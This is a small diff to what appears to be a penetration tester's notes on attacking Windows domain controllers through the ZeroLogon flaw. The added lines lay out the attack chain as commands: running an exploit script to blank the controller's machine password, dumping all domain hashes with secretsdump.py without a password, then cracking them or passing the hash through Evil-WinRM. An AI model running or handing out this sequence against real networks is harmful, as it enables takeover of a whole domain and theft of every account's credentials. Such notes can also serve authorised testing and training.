@@ -34,7 +34,10 @@ Check For Vulnerability
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit ZeroLogin
 
-      ./ExploitZeroLogin.py [DC-NetBIO_name] [DC-IP]
+      ./ExploitZeroLogin.py [DC-NetBIOS_name] [DC-IP]
+Now passsord is reset to No value // we can dump the hashes
+      ./secretsdump.py -just-dc -no-pass [DC-NetBIOS_name]\$@[DC-IP]
+Now hashes are pulled you can attempt to crack or PassThe-Has w/ Evil-winRM
 
 ..more to come
       
